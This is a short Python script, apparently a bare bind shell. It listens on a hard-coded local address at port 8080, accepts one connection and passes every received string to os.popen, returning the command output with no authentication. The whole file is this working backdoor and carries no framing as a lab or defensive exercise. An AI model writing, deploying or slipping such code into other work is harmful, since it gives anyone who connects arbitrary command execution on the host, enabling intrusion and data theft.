import socket
import os

sock = socket.socket()
try:
    sock.bind(('192.168.1.101', 8080))
except:
    sock.bind(('192.168.1.104', 8080))
sock.listen(2)
conn, addr = sock.accept()

print ('connected:', addr)
conn.send(b"[+]Connected\x0a\x0a")
while True:
    data = conn.recv(1024)
    a = os.popen(data.decode()).read().encode()
    conn.send(a)
    #print(data.decode())
    if not data:
        break

conn.close()
